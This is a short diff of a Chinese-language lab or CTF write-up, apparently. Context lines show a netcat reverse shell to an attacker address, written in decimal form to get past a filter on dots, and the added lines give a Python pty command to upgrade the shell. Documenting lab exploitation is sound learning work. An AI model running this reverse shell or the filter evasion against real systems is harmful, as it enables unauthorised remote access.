@@ -110,3 +110,9 @@ if __name__ == "__main__":
 
 尝试反弹shell，由于`.`用来判断文件类型，将ip地址转为10进制,环境是有nc的
 `nc 3232235905 23456 -e bash`
+![](attachments/Pasted%20image%2020230303111619.png)
+拿到shell，做一个tty
+`python -c "import pty;pty.spawn('/bin/bash')"`
+![](attachments/Pasted%20image%2020230303111910.png)
+
+
